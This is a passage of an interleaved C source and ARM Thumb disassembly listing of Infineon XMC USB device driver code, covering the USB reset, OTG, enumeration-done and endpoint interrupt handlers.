    xmc_device.global_register->dtxfsiz[i- 1U] = (uint32_t)(((256U + (i*(64U)))/4U) | ((uint32_t)16U << 16U));
 8004b4c:	69fb      	ldr	r3, [r7, #28]
 8004b4e:	3304      	adds	r3, #4
 8004b50:	019b      	lsls	r3, r3, #6
 8004b52:	089a      	lsrs	r2, r3, #2
 8004b54:	4b2d      	ldr	r3, [pc, #180]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004b56:	f8d3 11a0 	ldr.w	r1, [r3, #416]	; 0x1a0
 8004b5a:	69fb      	ldr	r3, [r7, #28]
 8004b5c:	3b01      	subs	r3, #1
 8004b5e:	f442 1280 	orr.w	r2, r2, #1048576	; 0x100000
 8004b62:	3340      	adds	r3, #64	; 0x40
 8004b64:	009b      	lsls	r3, r3, #2
 8004b66:	440b      	add	r3, r1
 8004b68:	605a      	str	r2, [r3, #4]
  for (i = 1U;i < (uint8_t)XMC_USBD_NUM_TX_FIFOS;i++)
 8004b6a:	69fb      	ldr	r3, [r7, #28]
 8004b6c:	3301      	adds	r3, #1
 8004b6e:	61fb      	str	r3, [r7, #28]
 8004b70:	69fb      	ldr	r3, [r7, #28]
 8004b72:	2b06      	cmp	r3, #6
 8004b74:	d9ea      	bls.n	8004b4c <XMC_USBD_lHandleUSBReset+0x8c>
  }

  /* flush the fifos for proper operation */
  XMC_USBD_lFlushTXFifo(0x10U); /* 0x10 == all fifos, see doc */
 8004b76:	2010      	movs	r0, #16
 8004b78:	f7ff fd50 	bl	800461c <XMC_USBD_lFlushTXFifo>
  XMC_USBD_lFlushTXFifo(0x0U);
 8004b7c:	2000      	movs	r0, #0
 8004b7e:	f7ff fd4d 	bl	800461c <XMC_USBD_lFlushTXFifo>
  XMC_USBD_lFlushRXFifo();
 8004b82:	f7ff fd8b 	bl	800469c <XMC_USBD_lFlushRXFifo>
  /* Flush learning queue not needed due to fifo config */
  /* enable ep0 interrupts */  
  daint.d32 = 0U;
 8004b86:	2300      	movs	r3, #0
 8004b88:	60fb      	str	r3, [r7, #12]
  daint.b.inep0 = 1U;
 8004b8a:	7b3b      	ldrb	r3, [r7, #12]
 8004b8c:	f043 0301 	orr.w	r3, r3, #1
 8004b90:	733b      	strb	r3, [r7, #12]
  daint.b.outep0 = 1U;
 8004b92:	7bbb      	ldrb	r3, [r7, #14]
 8004b94:	f043 0301 	orr.w	r3, r3, #1
 8004b98:	73bb      	strb	r3, [r7, #14]
  xmc_device.device_register->daintmsk = daint.d32;
 8004b9a:	4b1c      	ldr	r3, [pc, #112]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004b9c:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004ba0:	68fa      	ldr	r2, [r7, #12]
 8004ba2:	61da      	str	r2, [r3, #28]

  /* enable endpoint interrupts */
  /* out ep interrupts */
  XMC_USBD_EnableEventOUTEP(((uint32_t)XMC_USBD_EVENT_OUT_EP_TX_COMPLET | (uint32_t)XMC_USBD_EVENT_OUT_EP_DISABLED |
 8004ba4:	200f      	movs	r0, #15
 8004ba6:	f000 fbf9 	bl	800539c <XMC_USBD_EnableEventOUTEP>
		  	  	  	  	  	  (uint32_t)XMC_USBD_EVENT_OUT_EP_SETUP | (uint32_t)XMC_USBD_EVENT_OUT_EP_AHB_ERROR));

  /*in ep interrupts */
  XMC_USBD_EnableEventINEP(((uint32_t)XMC_USBD_EVENT_IN_EP_TX_COMPLET | (uint32_t)XMC_USBD_EVENT_IN_EP_DISABLED |
 8004baa:	200f      	movs	r0, #15
 8004bac:	f000 fc0e 	bl	80053cc <XMC_USBD_EnableEventINEP>
		  (uint32_t)XMC_USBD_EVENT_IN_EP_AHB_ERROR | (uint32_t)XMC_USBD_EVENT_IN_EP_TIMEOUT));


  /* Clear device Address */  
  dcfg.d32 = xmc_device.device_register->dcfg;
 8004bb0:	4b16      	ldr	r3, [pc, #88]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004bb2:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004bb6:	681b      	ldr	r3, [r3, #0]
 8004bb8:	60bb      	str	r3, [r7, #8]
  dcfg.b.devaddr = 0U;
 8004bba:	893b      	ldrh	r3, [r7, #8]
 8004bbc:	f36f 130a 	bfc	r3, #4, #7
 8004bc0:	813b      	strh	r3, [r7, #8]
  xmc_device.device_register->dcfg = dcfg.d32;
 8004bc2:	4b12      	ldr	r3, [pc, #72]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004bc4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004bc8:	68ba      	ldr	r2, [r7, #8]
 8004bca:	601a      	str	r2, [r3, #0]

  if(obj->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8004bcc:	687b      	ldr	r3, [r7, #4]
 8004bce:	7b5b      	ldrb	r3, [r3, #13]
 8004bd0:	2b01      	cmp	r3, #1
 8004bd2:	d104      	bne.n	8004bde <XMC_USBD_lHandleUSBReset+0x11e>
  {
    /* Clear Empty interrupt */
    xmc_device.device_register->dtknqr4_fifoemptymsk = 0U;
 8004bd4:	4b0d      	ldr	r3, [pc, #52]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004bd6:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004bda:	2200      	movs	r2, #0
 8004bdc:	635a      	str	r2, [r3, #52]	; 0x34
  }

  xmc_device.ep[0U].outInUse = 0U;
 8004bde:	4a0b      	ldr	r2, [pc, #44]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004be0:	6853      	ldr	r3, [r2, #4]
 8004be2:	f36f 1304 	bfc	r3, #4, #1
 8004be6:	6053      	str	r3, [r2, #4]
  xmc_device.ep[0U].inInUse = 0U;
 8004be8:	4a08      	ldr	r2, [pc, #32]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004bea:	6853      	ldr	r3, [r2, #4]
 8004bec:	f36f 03c3 	bfc	r3, #3, #1
 8004bf0:	6053      	str	r3, [r2, #4]

  xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_RESET);
 8004bf2:	4b06      	ldr	r3, [pc, #24]	; (8004c0c <XMC_USBD_lHandleUSBReset+0x14c>)
 8004bf4:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 8004bf8:	2004      	movs	r0, #4
 8004bfa:	4798      	blx	r3

  /* clear reset intr */
  XMC_USBD_ClearEvent(XMC_USBD_EVENT_RESET);
 8004bfc:	2004      	movs	r0, #4
 8004bfe:	f000 fb21 	bl	8005244 <XMC_USBD_ClearEvent>
}
 8004c02:	bf00      	nop
 8004c04:	3720      	adds	r7, #32
 8004c06:	46bd      	mov	sp, r7
 8004c08:	bd80      	pop	{r7, pc}
 8004c0a:	bf00      	nop
 8004c0c:	20000a84 	.word	0x20000a84

08004c10 <XMC_USBD_lHandleOTGInt>:
* @brief Handle OTG Interrupt
*
* It detects especially connect and disconnect events.
*/
static void XMC_USBD_lHandleOTGInt(void) 
{
 8004c10:	b580      	push	{r7, lr}
 8004c12:	b082      	sub	sp, #8
 8004c14:	af00      	add	r7, sp, #0
  gotgint_data_t data;
  data.d32 = xmc_device.global_register->gotgint;
 8004c16:	4b0f      	ldr	r3, [pc, #60]	; (8004c54 <XMC_USBD_lHandleOTGInt+0x44>)
 8004c18:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004c1c:	685b      	ldr	r3, [r3, #4]
 8004c1e:	607b      	str	r3, [r7, #4]
  if (data.b.sesenddet)
 8004c20:	793b      	ldrb	r3, [r7, #4]
 8004c22:	f003 0304 	and.w	r3, r3, #4
 8004c26:	b2db      	uxtb	r3, r3
 8004c28:	2b00      	cmp	r3, #0
 8004c2a:	d00b      	beq.n	8004c44 <XMC_USBD_lHandleOTGInt+0x34>
  {
		xmc_device.IsPowered = 0U;
 8004c2c:	4a09      	ldr	r2, [pc, #36]	; (8004c54 <XMC_USBD_lHandleOTGInt+0x44>)
 8004c2e:	f892 31fe 	ldrb.w	r3, [r2, #510]	; 0x1fe
 8004c32:	f36f 0382 	bfc	r3, #2, #1
 8004c36:	f882 31fe 	strb.w	r3, [r2, #510]	; 0x1fe
		xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_POWER_OFF);
 8004c3a:	4b06      	ldr	r3, [pc, #24]	; (8004c54 <XMC_USBD_lHandleOTGInt+0x44>)
 8004c3c:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 8004c40:	2001      	movs	r0, #1
 8004c42:	4798      	blx	r3
  }
  XMC_USBD_lClearEventOTG(data.d32);
 8004c44:	687b      	ldr	r3, [r7, #4]
 8004c46:	4618      	mov	r0, r3
 8004c48:	f000 fb62 	bl	8005310 <XMC_USBD_lClearEventOTG>

}
 8004c4c:	bf00      	nop
 8004c4e:	3708      	adds	r7, #8
 8004c50:	46bd      	mov	sp, r7
 8004c52:	bd80      	pop	{r7, pc}
 8004c54:	20000a84 	.word	0x20000a84

08004c58 <XMC_USBD_lHandleEnumDone>:
 * @brief Interrupt handler for device enumeration done.
 *
 * Handles the enumeration done from dwc_otg, when the host has enumerated the device.
 */
static void XMC_USBD_lHandleEnumDone(void) 
{
 8004c58:	b580      	push	{r7, lr}
 8004c5a:	b082      	sub	sp, #8
 8004c5c:	af00      	add	r7, sp, #0
  /* Normaly we need to check dctl
   * We are always fullspeed, so max it up. */
  depctl_data_t epctl;
  gusbcfg_data_t gusbcfg;
	
  epctl.d32=xmc_device.endpoint_in_register[0U]->diepctl;
 8004c5e:	4b1b      	ldr	r3, [pc, #108]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004c60:	f8d3 31a8 	ldr.w	r3, [r3, #424]	; 0x1a8
 8004c64:	681b      	ldr	r3, [r3, #0]
 8004c66:	607b      	str	r3, [r7, #4]
  epctl.b.mps = 0x00U; /* 64 Byte, this is also automatically set for out ep */
 8004c68:	88bb      	ldrh	r3, [r7, #4]
 8004c6a:	f36f 030a 	bfc	r3, #0, #11
 8004c6e:	80bb      	strh	r3, [r7, #4]
  xmc_device.endpoint_in_register[0U]->diepctl = epctl.d32;
 8004c70:	4b16      	ldr	r3, [pc, #88]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004c72:	f8d3 31a8 	ldr.w	r3, [r3, #424]	; 0x1a8
 8004c76:	687a      	ldr	r2, [r7, #4]
 8004c78:	601a      	str	r2, [r3, #0]

  /* update device connected flag */
  xmc_device.IsConnected = 1U;
 8004c7a:	4a14      	ldr	r2, [pc, #80]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004c7c:	f892 31fe 	ldrb.w	r3, [r2, #510]	; 0x1fe
 8004c80:	f043 0301 	orr.w	r3, r3, #1
 8004c84:	f882 31fe 	strb.w	r3, [r2, #510]	; 0x1fe
  xmc_device.IsPowered = 1U;
 8004c88:	4a10      	ldr	r2, [pc, #64]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004c8a:	f892 31fe 	ldrb.w	r3, [r2, #510]	; 0x1fe
 8004c8e:	f043 0304 	orr.w	r3, r3, #4
 8004c92:	f882 31fe 	strb.w	r3, [r2, #510]	; 0x1fe

  xmc_device.DeviceEvent_cb(XMC_USBD_EVENT_CONNECT);
 8004c96:	4b0d      	ldr	r3, [pc, #52]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004c98:	f8d3 3200 	ldr.w	r3, [r3, #512]	; 0x200
 8004c9c:	2002      	movs	r0, #2
 8004c9e:	4798      	blx	r3

  /* Set Trim */  
  gusbcfg.d32 = xmc_device.global_register->gusbcfg;
 8004ca0:	4b0a      	ldr	r3, [pc, #40]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004ca2:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004ca6:	68db      	ldr	r3, [r3, #12]
 8004ca8:	603b      	str	r3, [r7, #0]
  gusbcfg.b.usbtrdtim = 9U; /* default value for LS/FS */
 8004caa:	787b      	ldrb	r3, [r7, #1]
 8004cac:	2209      	movs	r2, #9
 8004cae:	f362 0385 	bfi	r3, r2, #2, #4
 8004cb2:	707b      	strb	r3, [r7, #1]
  xmc_device.global_register->gusbcfg = gusbcfg.d32;
 8004cb4:	4b05      	ldr	r3, [pc, #20]	; (8004ccc <XMC_USBD_lHandleEnumDone+0x74>)
 8004cb6:	f8d3 31a0 	ldr.w	r3, [r3, #416]	; 0x1a0
 8004cba:	683a      	ldr	r2, [r7, #0]
 8004cbc:	60da      	str	r2, [r3, #12]

  /* clear interrupt */
  XMC_USBD_ClearEvent(XMC_USBD_EVENT_ENUMDONE);
 8004cbe:	200b      	movs	r0, #11
 8004cc0:	f000 fac0 	bl	8005244 <XMC_USBD_ClearEvent>
}
 8004cc4:	bf00      	nop
 8004cc6:	3708      	adds	r7, #8
 8004cc8:	46bd      	mov	sp, r7
 8004cca:	bd80      	pop	{r7, pc}
 8004ccc:	20000a84 	.word	0x20000a84

08004cd0 <XMC_USBD_lHandleOEPInt>:
 *
 * The interrupt handler first checks, which endpoint has caused the interrupt and then
 * determines, which interrupt should be handled.
 */
static void XMC_USBD_lHandleOEPInt(const XMC_USBD_t *const obj) 
{
 8004cd0:	b580      	push	{r7, lr}
 8004cd2:	b08c      	sub	sp, #48	; 0x30
 8004cd4:	af00      	add	r7, sp, #0
 8004cd6:	6078      	str	r0, [r7, #4]
  uint16_t temp;
  uint16_t temp1;
  uint16_t mask;
  uint8_t ep_num;
	
  daint.d32 = xmc_device.device_register->daint;
 8004cd8:	4b69      	ldr	r3, [pc, #420]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004cda:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004cde:	699b      	ldr	r3, [r3, #24]
 8004ce0:	61fb      	str	r3, [r7, #28]
  
  daintmsk.d32 = xmc_device.device_register->daintmsk;
 8004ce2:	4b67      	ldr	r3, [pc, #412]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004ce4:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004ce8:	69db      	ldr	r3, [r3, #28]
 8004cea:	61bb      	str	r3, [r7, #24]
  
  doepmsk.d32 = xmc_device.device_register->doepmsk;  
 8004cec:	4b64      	ldr	r3, [pc, #400]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004cee:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004cf2:	695b      	ldr	r3, [r3, #20]
 8004cf4:	617b      	str	r3, [r7, #20]
  
  mask = daint.ep.out & daintmsk.ep.out;
 8004cf6:	8bfa      	ldrh	r2, [r7, #30]
 8004cf8:	8b7b      	ldrh	r3, [r7, #26]
 8004cfa:	4013      	ands	r3, r2
 8004cfc:	85bb      	strh	r3, [r7, #44]	; 0x2c
  ep_num = 0U;
 8004cfe:	2300      	movs	r3, #0
 8004d00:	f887 302f 	strb.w	r3, [r7, #47]	; 0x2f
  doeptsiz.d32 = 0U;
 8004d04:	2300      	movs	r3, #0
 8004d06:	60fb      	str	r3, [r7, #12]
 
  while ((uint16_t)mask >> ep_num)
 8004d08:	e0aa      	b.n	8004e60 <XMC_USBD_lHandleOEPInt+0x190>
  {
    temp1 = (mask >> (uint16_t)ep_num);
 8004d0a:	8dba      	ldrh	r2, [r7, #44]	; 0x2c
 8004d0c:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004d10:	fa42 f303 	asr.w	r3, r2, r3
 8004d14:	857b      	strh	r3, [r7, #42]	; 0x2a
    temp = temp1 & 0x1U;
 8004d16:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8004d18:	f003 0301 	and.w	r3, r3, #1
 8004d1c:	853b      	strh	r3, [r7, #40]	; 0x28
    if (temp)
 8004d1e:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8004d20:	2b00      	cmp	r3, #0
 8004d22:	f000 8098 	beq.w	8004e56 <XMC_USBD_lHandleOEPInt+0x186>
    {
      /* load register data for endpoint */
      ep = &xmc_device.ep[ep_num];
 8004d26:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004d2a:	2234      	movs	r2, #52	; 0x34
 8004d2c:	fb02 f303 	mul.w	r3, r2, r3
 8004d30:	4a53      	ldr	r2, [pc, #332]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004d32:	4413      	add	r3, r2
 8004d34:	627b      	str	r3, [r7, #36]	; 0x24
      doepint.d32 = xmc_device.endpoint_out_register[ep_num]->doepint & doepmsk.d32;
 8004d36:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004d3a:	4a51      	ldr	r2, [pc, #324]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004d3c:	3370      	adds	r3, #112	; 0x70
 8004d3e:	009b      	lsls	r3, r3, #2
 8004d40:	4413      	add	r3, r2
 8004d42:	685b      	ldr	r3, [r3, #4]
 8004d44:	689a      	ldr	r2, [r3, #8]
 8004d46:	697b      	ldr	r3, [r7, #20]
 8004d48:	4013      	ands	r3, r2
 8004d4a:	613b      	str	r3, [r7, #16]
      if(obj->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004d4c:	687b      	ldr	r3, [r7, #4]
 8004d4e:	7b5b      	ldrb	r3, [r3, #13]
 8004d50:	2b00      	cmp	r3, #0
 8004d52:	d108      	bne.n	8004d66 <XMC_USBD_lHandleOEPInt+0x96>
      {
        doeptsiz.d32 = xmc_device.endpoint_out_register[ep_num]->doeptsiz;
 8004d54:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004d58:	4a49      	ldr	r2, [pc, #292]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004d5a:	3370      	adds	r3, #112	; 0x70
 8004d5c:	009b      	lsls	r3, r3, #2
 8004d5e:	4413      	add	r3, r2
 8004d60:	685b      	ldr	r3, [r3, #4]
 8004d62:	691b      	ldr	r3, [r3, #16]
 8004d64:	60fb      	str	r3, [r7, #12]
      }
	  /* Setup Phase Complete */
      if (doepint.b.setup)
 8004d66:	7c3b      	ldrb	r3, [r7, #16]
 8004d68:	f003 0308 	and.w	r3, r3, #8
 8004d6c:	b2db      	uxtb	r3, r3
 8004d6e:	2b00      	cmp	r3, #0
 8004d70:	d02f      	beq.n	8004dd2 <XMC_USBD_lHandleOEPInt+0x102>
      {
        /* ep0 not stalled any more */
        ep->isStalled = 0U;
 8004d72:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8004d74:	7913      	ldrb	r3, [r2, #4]
 8004d76:	f36f 1345 	bfc	r3, #5, #1
 8004d7a:	7113      	strb	r3, [r2, #4]
        if(obj->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004d7c:	687b      	ldr	r3, [r7, #4]
 8004d7e:	7b5b      	ldrb	r3, [r3, #13]
 8004d80:	2b00      	cmp	r3, #0
 8004d82:	d10a      	bne.n	8004d9a <XMC_USBD_lHandleOEPInt+0xca>
        {
          /* calculate size for setup packet */
		  ep->outBytesAvailable = (uint32_t)(((uint32_t)XMC_USBD_SETUP_COUNT -
		  (uint32_t)((deptsiz0_data_t*)&doeptsiz)->b.supcnt)*(uint32_t)XMC_USBD_SETUP_SIZE);
 8004d84:	f107 030c 	add.w	r3, r7, #12
 8004d88:	78db      	ldrb	r3, [r3, #3]
 8004d8a:	f3c3 1341 	ubfx	r3, r3, #5, #2
 8004d8e:	b2db      	uxtb	r3, r3
		  ep->outBytesAvailable = (uint32_t)(((uint32_t)XMC_USBD_SETUP_COUNT -
 8004d90:	f1c3 0303 	rsb	r3, r3, #3
 8004d94:	00da      	lsls	r2, r3, #3
 8004d96:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004d98:	611a      	str	r2, [r3, #16]
        }
		if(obj->usbd_transfer_mode == XMC_USBD_USE_FIFO)
 8004d9a:	687b      	ldr	r3, [r7, #4]
 8004d9c:	7b5b      	ldrb	r3, [r3, #13]
 8004d9e:	2b01      	cmp	r3, #1
 8004da0:	d106      	bne.n	8004db0 <XMC_USBD_lHandleOEPInt+0xe0>
		{
			ep->outBytesAvailable += ep->xferCount;
 8004da2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004da4:	691a      	ldr	r2, [r3, #16]
 8004da6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004da8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004daa:	441a      	add	r2, r3
 8004dac:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004dae:	611a      	str	r2, [r3, #16]
		}
		ep->outInUse = 0U;
 8004db0:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8004db2:	6853      	ldr	r3, [r2, #4]
 8004db4:	f36f 1304 	bfc	r3, #4, #1
 8004db8:	6053      	str	r3, [r2, #4]
		xmc_device.EndpointEvent_cb(0U,XMC_USBD_EP_EVENT_SETUP); /* signal endpoint event */
 8004dba:	4b31      	ldr	r3, [pc, #196]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004dbc:	f8d3 3204 	ldr.w	r3, [r3, #516]	; 0x204
 8004dc0:	2100      	movs	r1, #0
 8004dc2:	2000      	movs	r0, #0
 8004dc4:	4798      	blx	r3
				/* clear the interrupt */
		XMC_USBD_ClearEventOUTEP((uint32_t)XMC_USBD_EVENT_OUT_EP_SETUP,ep_num);
 8004dc6:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004dca:	4619      	mov	r1, r3
 8004dcc:	2008      	movs	r0, #8
 8004dce:	f000 facd 	bl	800536c <XMC_USBD_ClearEventOUTEP>
      }
      if (doepint.b.xfercompl)
 8004dd2:	7c3b      	ldrb	r3, [r7, #16]
 8004dd4:	f003 0301 	and.w	r3, r3, #1
 8004dd8:	b2db      	uxtb	r3, r3
 8004dda:	2b00      	cmp	r3, #0
 8004ddc:	d034      	beq.n	8004e48 <XMC_USBD_lHandleOEPInt+0x178>
      {
        if(obj->usbd_transfer_mode == XMC_USBD_USE_DMA)
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	7b5b      	ldrb	r3, [r3, #13]
 8004de2:	2b00      	cmp	r3, #0
 8004de4:	d115      	bne.n	8004e12 <XMC_USBD_lHandleOEPInt+0x142>
        {
          uint32_t bytes = (ep->xferLength - ep->xferCount) - doeptsiz.b.xfersize;
 8004de6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004de8:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8004dea:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004dec:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004dee:	1ad3      	subs	r3, r2, r3
 8004df0:	68fa      	ldr	r2, [r7, #12]
 8004df2:	f3c2 0212 	ubfx	r2, r2, #0, #19
 8004df6:	1a9b      	subs	r3, r3, r2
 8004df8:	623b      	str	r3, [r7, #32]
          ep->xferCount += bytes;
 8004dfa:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004dfc:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8004dfe:	6a3b      	ldr	r3, [r7, #32]
 8004e00:	441a      	add	r2, r3
 8004e02:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e04:	62da      	str	r2, [r3, #44]	; 0x2c
          ep->xferBuffer += bytes;
 8004e06:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e08:	6a5a      	ldr	r2, [r3, #36]	; 0x24
 8004e0a:	6a3b      	ldr	r3, [r7, #32]
 8004e0c:	441a      	add	r2, r3
 8004e0e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e10:	625a      	str	r2, [r3, #36]	; 0x24
				}
        if (ep->xferTotal == ep->xferLength)
 8004e12:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e14:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8004e16:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e18:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004e1a:	429a      	cmp	r2, r3
 8004e1c:	d111      	bne.n	8004e42 <XMC_USBD_lHandleOEPInt+0x172>
        {
          ep->outBytesAvailable = ep->xferCount;
 8004e1e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e20:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8004e22:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8004e24:	611a      	str	r2, [r3, #16]
          ep->outInUse = 0U;
 8004e26:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8004e28:	6853      	ldr	r3, [r2, #4]
 8004e2a:	f36f 1304 	bfc	r3, #4, #1
 8004e2e:	6053      	str	r3, [r2, #4]
          xmc_device.EndpointEvent_cb(ep_num,XMC_USBD_EP_EVENT_OUT);
 8004e30:	4b13      	ldr	r3, [pc, #76]	; (8004e80 <XMC_USBD_lHandleOEPInt+0x1b0>)
 8004e32:	f8d3 3204 	ldr.w	r3, [r3, #516]	; 0x204
 8004e36:	f897 202f 	ldrb.w	r2, [r7, #47]	; 0x2f
 8004e3a:	2101      	movs	r1, #1
 8004e3c:	4610      	mov	r0, r2
 8004e3e:	4798      	blx	r3
 8004e40:	e002      	b.n	8004e48 <XMC_USBD_lHandleOEPInt+0x178>
        }
        else
        {
          XMC_USBD_lStartReadXfer(ep);
 8004e42:	6a78      	ldr	r0, [r7, #36]	; 0x24
 8004e44:	f7ff fcb4 	bl	80047b0 <XMC_USBD_lStartReadXfer>
        }

      }

      XMC_USBD_ClearEventOUTEP(doepint.d32,ep_num);
 8004e48:	693b      	ldr	r3, [r7, #16]
 8004e4a:	f897 202f 	ldrb.w	r2, [r7, #47]	; 0x2f
 8004e4e:	4611      	mov	r1, r2
 8004e50:	4618      	mov	r0, r3
 8004e52:	f000 fa8b 	bl	800536c <XMC_USBD_ClearEventOUTEP>
    }
    ep_num++;
 8004e56:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004e5a:	3301      	adds	r3, #1
 8004e5c:	f887 302f 	strb.w	r3, [r7, #47]	; 0x2f
  while ((uint16_t)mask >> ep_num)
 8004e60:	8dba      	ldrh	r2, [r7, #44]	; 0x2c
 8004e62:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004e66:	fa42 f303 	asr.w	r3, r2, r3
 8004e6a:	2b00      	cmp	r3, #0
 8004e6c:	f47f af4d 	bne.w	8004d0a <XMC_USBD_lHandleOEPInt+0x3a>
  }

  /* clear interrupt */
  XMC_USBD_ClearEvent(XMC_USBD_EVENT_OUTEP);
 8004e70:	200d      	movs	r0, #13
 8004e72:	f000 f9e7 	bl	8005244 <XMC_USBD_ClearEvent>
}
 8004e76:	bf00      	nop
 8004e78:	3730      	adds	r7, #48	; 0x30
 8004e7a:	46bd      	mov	sp, r7
 8004e7c:	bd80      	pop	{r7, pc}
 8004e7e:	bf00      	nop
 8004e80:	20000a84 	.word	0x20000a84

08004e84 <XMC_USBD_lHandleIEPInt>:
 *
 * The interrupt handler first checks, which endpoint has caused the interrupt and then
 * determines, which interrupt should be handled.
 */
static void XMC_USBD_lHandleIEPInt(const XMC_USBD_t *const obj) 
{
 8004e84:	b580      	push	{r7, lr}
 8004e86:	b08c      	sub	sp, #48	; 0x30
 8004e88:	af00      	add	r7, sp, #0
 8004e8a:	6078      	str	r0, [r7, #4]
  uint16_t temp1;
  uint16_t mask;
  uint8_t ep_num;
  uint32_t inepint;
	
  daint.d32 = xmc_device.device_register->daint;
 8004e8c:	4b6b      	ldr	r3, [pc, #428]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004e8e:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004e92:	699b      	ldr	r3, [r3, #24]
 8004e94:	617b      	str	r3, [r7, #20]
  
  diepmsk.d32 = xmc_device.device_register->diepmsk;
 8004e96:	4b69      	ldr	r3, [pc, #420]	; (800503c <XMC_USBD_lHandleIEPInt+0x1b8>)
 8004e98:	f8d3 31a4 	ldr.w	r3, [r3, #420]	; 0x1a4
 8004e9c:	691b      	ldr	r3, [r3, #16]
 8004e9e:	613b      	str	r3, [r7, #16]
  
  dieptsiz.d32 = 0U;
 8004ea0:	2300      	movs	r3, #0
 8004ea2:	60bb      	str	r3, [r7, #8]
  mask = daint.ep.in;
 8004ea4:	8abb      	ldrh	r3, [r7, #20]
 8004ea6:	85bb      	strh	r3, [r7, #44]	; 0x2c
  ep_num = 0U;
 8004ea8:	2300      	movs	r3, #0
 8004eaa:	f887 302f 	strb.w	r3, [r7, #47]	; 0x2f
  
  while ((uint16_t)mask >> ep_num)
 8004eae:	e0b6      	b.n	800501e <XMC_USBD_lHandleIEPInt+0x19a>
  {
    temp1 = ((uint16_t)mask >> (uint16_t)ep_num);
 8004eb0:	8dba      	ldrh	r2, [r7, #44]	; 0x2c
 8004eb2:	f897 302f 	ldrb.w	r3, [r7, #47]	; 0x2f
 8004eb6:	fa42 f303 	asr.w	r3, r2, r3
 8004eba:	857b      	strh	r3, [r7, #42]	; 0x2a
    temp = (uint16_t)temp1 & (uint16_t)0x1U;
 8004ebc:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8004ebe:	f003 0301 	and.w	r3, r3, #1
 8004ec2:	853b      	strh	r3, [r7, #40]	; 0x28
    if ((uint16_t)temp)
 8004ec4:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8004ec6:	2b00      	cmp	r3, #0
 8004ec8:	f000 80a4 	beq.w	8005014 <XMC_USBD_lHandleIEPInt+0x190>
    {
      ep = &xmc_device.ep[ep_num];
